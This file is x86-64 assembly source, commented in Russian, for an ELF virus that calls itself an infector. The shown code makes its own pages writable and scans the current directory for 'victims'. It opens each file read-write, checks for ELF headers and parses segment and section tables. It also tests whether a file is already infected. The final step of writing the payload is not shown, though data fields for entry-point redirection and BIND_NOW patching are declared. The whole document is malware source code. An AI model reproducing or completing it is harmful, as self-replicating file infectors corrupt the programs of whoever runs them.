    .text 0

    .global	_start
	.type	_start, @function

_start:
    leaq    _start_infector(%rip), %rsi
    jmp     *%rsi

/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

#define CANARY_VAL 0xDEADBEEFBAADF00D

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                  jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm


    // Марос для проверки, не переполнен ли стек
    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm


/// печать сообщения об ошибке и выход
/// из программы
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp    _restore_registers_and_stack

/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402
    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30
    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_OFFSET, 0x18
    .set SHDR_SH_SIZE, 0x20

_msg_infection_success:
    .ascii " is successfully infected \n"
    .set len_msg_infection_success, . - _msg_infection_success

_msg_cur_infection:
    .ascii " file: infection try \n"

mprotect_ok:
    .quad -1

old_rsp:
    .quad 0     # вершина стека жертвы

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

_stack_top:
    .space 6000, 0

_stack_bottom:
    .quad 0

fd:
    .quad 0

cur_filename:
    .quad 0

dir_name:
    .string "./"

dir_buf:
    .space 8000, 0

dir_struct:
    .space 30, 0

dir_buf_ptr:
    .quad 0

file_name_ptr:
    .quad 0

string_length:
    .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

virus_new_vaddr:
    .quad 0

virus_new_phdr:
    .space 0x38, 0

virus_new_shdr:
    .space 0x40, 0

last_seg_vaddr:
    .quad 0

last_seg_allign:
    .quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_bind_now_size:
	.quad 0

victim_code_after_bind_now_size:
	.quad 0

victim_code_before_bind_now_addr:
	.quad 0

victim_code_after_bind_now_addr:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

dynamic_records_offset:
	.quad 0

dynamic_records_size:
	.quad 0

dynamic_records_vaddr:
    .quad 0

new_bind_now_flag_record_size:
    .quad 0

new_bind_now_record_frm_dynamic_offset:
	.quad 0

original_e_entry:
	.quad 0

offset_to_e_entry:
	.quad 0

move_victim_offset:
    .quad 0

offset_to_e_entry_frm_file_begin:
	.quad 0

frm_orig_e_entry_to_virus_e_entry_offset:
    .quad 0

offset_to_vict_code_frm_file_begin:
    .quad 0

sh_name_indx:
    .long 0

first_seg_vaddr:
	.quad 0

first_seg_addr:
	.quad 0

GOT_vaddr:
	.quad 0


/// Разрешает коду вируса писать
/// в самого себя
_allow_write_into_code:
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    mov     $0x7, %rdx          # RW+EXEC flags - $RDX
    mov     $0xA, %rax          # mprotect handle
    syscall

    test    %rax, %rax
    jne     _allow_write_into_code_error

    mov     %rax, mprotect_ok(%rip)
_allow_write_into_code_exit:
    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx

    ret

    ERR_MSG _allow_write_into_code "mprotect in _start"

/// Сохраняет все регистры кроме rax -
/// он уже изменен - в переменные и
/// настраивает стек
/// Проверяет MPROTECT_OK
_save_registers:
    mov   mprotect_ok(%rip), %rax
    test  %rax, %rax
    jne   _save_registers_fail

    mov     %rsp, old_rsp(%rip)
    lea     _stack_bottom(%rip), %rsp

    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    xor     %rax, %rax
    jmp     _save_registers_exit

_save_registers_fail:
    mov     $-1, %rax

_save_registers_exit:
    jmp     _clear_old_data

/// Очищает данные о секции dynamic,
/// GOT, и записи BIND_NOW
_clear_dynamic_and_bind_now_data:
    movq    $0, dynamic_records_offset(%rip)
    movq    $0, dynamic_records_size(%rip)
    movq    $0, dynamic_records_vaddr(%rip)
    movq    $0, GOT_vaddr(%rip)
    movq    $0, new_bind_now_flag_record_size(%rip)

    ret

/// Открывает директорию
/// и считывает все ее записи в буфер
_my_readdir:
    push    %rdi
    push    %rsi
    push    %rbx

    // открыть директорию
    lea     dir_name(%rip), %rdi
    mov     $0x0, %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall

    test     %rax, %rax
    jl      _my_readdir_open_error

    // заполянем структуру потока
    lea     dir_struct(%rip), %rbx
    mov     %eax, (%rbx)
    movq    $0x8000, 0x8(%rbx) # размер буфера


    // параметры getdents
    mov     (%rbx), %rdi
    lea     dir_buf(%rip), %rsi
    mov     8(%rbx), %rdx

    // вызов getdents
    mov    $0x4e, %rax
    syscall

    // в случае успеха возвращ.
    // кол-во считанных байт
    // иначе 0
    cmp     $0x0, %rax
    jle     _my_readdir_read_error

    // сохранили указатель на первую структуру
    // в буфере
    lea     dir_buf_ptr(%rip), %rbx
    mov     %rsi, (%rbx)

    xor     %rax, %rax
    pop     %rbx
    pop     %rsi
    pop     %rdi

    ret

    ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
    ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"


/// Проверяет: указатель на текущую запись
/// Успех: заполняет cur_filename указателем на
/// имя и возвращает 0 в rax
/// Фейл: заполняет cur_filename нулем и
/// возвращает -1 в rax
_get_file_name:
    push    %rbx
    push    %rcx

    // указатель не нулевой?
    mov     dir_buf_ptr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_file_name_fail

    // получили имя
    lea     0x12(%rbx), %rax
    mov     %rax, file_name_ptr(%rip)

    xor     %rcx, %rcx
    // получили размер текущей структуры
    // (он меняется)
    movzwl  0x10(%rbx), %ecx
    // сдвинули указатель на
    // следующую структуру
    add     %rcx, %rbx

    mov     %rbx, dir_buf_ptr(%rip)
    xor     %rax, %rax

    jmp    _get_file_name_exit
_get_file_name_fail:
    mov     $-1, %rax
    movq    $0x0, file_name_ptr(%rip)

_get_file_name_exit:
    pop     %rcx
    pop     %rbx

    ret


/// _MY_STRLEN
/// PARAMS -
/// RDI - указатель на строку
/// Изменяет STRING_LENGTH
_my_strlen:
    xor     %rax, %rax

    push    %rcx
    push    %rbx

    test    %rdi, %rdi
    je      _my_strlen_fail
    // je      _my_strlen_error

    mov     $0x64, %rcx
    repne   scasb

    mov     $0x64, %rbx
    sub     %rcx, %rbx
    mov     %rbx, %rax
    dec     %rax

    mov     %rax, string_length(%rip)
    xor     %rax, %rax

    jmp    _my_strlen_exit

_my_strlen_fail:
    mov     $-1, %rax

_my_strlen_exit:
    pop     %rbx
    pop     %rcx

    ret

    ERR_MSG _my_strlen "_my_strlen: NULL pointer"

/// WRITE TO STDOUT
/// @PARAMS
///   - %RSI - msg pointer
///   - %RDX - msg size
_my_write:
    mov      $0x1, %rax          # write
    mov      %rax, %rdi          # to stdout
    syscall
    ret

/// Печатает имя файла,
/// который пытается заразить вирус в
/// данный момент
_print_infection_log:
    push     %rsi
    push     %rdi
    push     %rdx

    mov      file_name_ptr(%rip), %rsi
    test     %rsi, %rsi
    je       _print_infection_log_fail

    mov      file_name_ptr(%rip), %rdi
    call     _my_strlen

    mov      string_length(%rip), %rdx
    test     %rdx, %rdx
    je       _print_infection_log_fail

    call    _my_write

    lea     _msg_cur_infection(%rip), %rsi
    mov     $0x16, %rdx
    call    _my_write

_print_infection_log_fail:
    mov     $-1, %rax

_print_infection_log_exit:
    pop     %rdx
    pop     %rdi
    pop     %rsi

    ret

/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
/// или отричательное значение
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax

    jl      _openfile_exit

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    # сохранить дескриптор жертвы
    mov     %rax, fd(%rip)

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    // mov     -0x70(%rbp), %rsi   # filesz
    mov     -0xA0(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
/// @ RETURN VALUE
/// * RAX - указатель на файл в памяти или отриц. заначени
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
  	ret

    ERR_MSG _my_stat "my_stat"

/// IS_IT_ELF
/// PARAMS
/// Проверяет наличие магических байт в
/// загруженном эльфе
/// Если магические байты есть, то
/// возвращает 1 в RAX
/// В противном случае - 0
magic_bytes_example:
    .quad 0x10102464c457f

_is_it_elf:
    push    %rdx
    push    %rbx
    push    %rsi
    push    %rcx

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _is_it_elf_fail

    movq    (%rbx), %rdx
    mov     magic_bytes_example(%rip), %rsi

    cmp     %rsi, %rdx
    jne     _is_it_elf_fail

    xor     %rax, %rax
    jmp     _is_it_elf_exit

_is_it_elf_fail:
    mov     $-1, %rax

_is_it_elf_exit:
    pop     %rcx
    pop     %rsi
    pop     %rbx
    pop     %rdx

    ret

/// Открывает файл и сохраняет его
/// адрес
_get_victim_addr:
    push    %rdi
    push    %rsi

    mov     file_name_ptr(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile

    cmp     $0x0,  %rax
    jl      _get_victim_addr_exit

    mov     %rax, victim_elf_addr(%rip)
    xor     %rax, %rax

_get_victim_addr_exit:
    pop    %rsi
    pop    %rdi

    ret
/// получает данные о заголовках сегментов
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_phdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_phdrs_info_fail

    mov     %rdi, %rsi
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_phdr_table_addr(%rip)

    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_phdr_amount(%rip)

    mov     $0x38, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_phdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_phdrs_info_exit

_get_phdrs_info_fail:
    mov     $-1, %rax

_get_phdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret
/// получает данные о заголовках секций
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_shdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_shdrs_info_fail
    mov     %rdi, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_shdr_table_addr(%rip)

    mov     ELF_E_SHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_shdr_amount(%rip)

    mov     $0x40, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_shdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_shdrs_info_exit

_get_shdrs_info_fail:
    mov     $-1, %rax

_get_shdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret

/// Ищет и заполняет данные о
/// первом сегменте кода эльфа
_find_first_seg_vaddr:
    push    %rcx
    push    %r8

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_first_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_first_seg_vaddr_fail

    mov     %r8, %rdi

_find_first_seg_vaddr_cycle:
    cmp     $0x1, (%rdi)
    jne     _find_first_seg_vaddr_next

    cmp     $0x1, (%r8)
    jne     _set_first_seg

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jl      _set_first_seg
    jmp     _find_first_seg_vaddr_next

_set_first_seg:
    mov     %rdi, %r8

_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rdi
    mov     %rdi, (%rsi)

    leaq    first_seg_addr(%rip), %rsi
    mov     %r8, (%rsi)

    xor     %rax, %rax
    jmp    _find_first_seg_vaddr_exit

_find_first_seg_vaddr_fail:
    mov     $-1, %rax

_find_first_seg_vaddr_exit:
    pop     %r8
    pop     %rcx

    ret

/// _CHECK_FILE_INFECTION
/// Проверяет, является ли открытый файл зараженным
/// - проверяем каждый загружаемый сегмент
/// - берем его смещение, считаем адрес его кода
///   в памяти
/// - сравнивам первый 32 байта по этому адресу со
///   start вируса
/// - если совпали - файл заражен, вернуть -1
/// - иначе проверить все сегменты, если нигде не совпало,
/// вернуть 0
_check_file_infection:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_elf_addr(%rip), %rdx
    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_amount(%rip), %rcx
    leaq    _start(%rip), %rdi

    test     %rdx, %rdx
    je      _infected

    test     %rsi, %rsi
    je      _infected

    test     %rcx, %rcx
    je      _infected

_check_file_infection_cycle:

    push    %rcx
    mov     SHDR_SH_TYPE(%rsi), %rbx

    // секция SHT_PROGBITS?
    cmp     $0x1, %bl
    jne     _next_segm


    mov     SHDR_SH_OFFSET(%rsi), %rbx
    mov     $0x4, %rcx

    // адрес сегмента в памяти
    add     %rdx, %rbx

_check_segm_infection_cycle:
    movq    (%rdi), %rax
    movq    (%rbx), %r8

    cmp     %rax,  %r8
    jne     _next_segm

    add     $0x8, %rdi
    add     $0x8, %rbx

    loop    _check_segm_infection_cycle
    jmp     _infected

_next_segm:
    pop     %rcx
    add     $0x40, %rsi
    loop    _check_file_infection_cycle

    jmp     _clear

_infected:
    pop     %rcx
    mov     $-1, %rax
    jmp     _check_file_infection_exit

_clear:
    mov     $0x0, %rax

_check_file_infection_exit:
    pop    %rsi
    pop    %rdi
    pop    %r8
    pop    %rdx
    pop    %rcx
    pop    %rbx

    ret

/// Вызывает парсинг жертвы
/// В случае провала возвращ -1
_parse_victim:
    call    _get_victim_addr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _is_it_elf
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_shdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _check_file_infection
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_first_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    xor     %rax, %rax
    jmp     _parse_victim_exit
_parse_victim_fail:
    mov   $-1, %rax

_parse_victim_exit:
    ret

/// старт инфектора
_start_infector:
    call    _allow_write_into_code
    jmp     _save_registers

_clear_old_data:
    call    _clear_dynamic_and_bind_now_data
    call    _my_readdir

_get_victim_name:
    call    _get_file_name
    call    _print_infection_log

    call    _parse_victim
    test    %rax, %rax
    jnz     _get_victim_name

/// Возвращает регистры в состояние
/// до исполнения вируса
_restore_registers_and_stack:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15

/// выход из инфетора
_global_exit:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
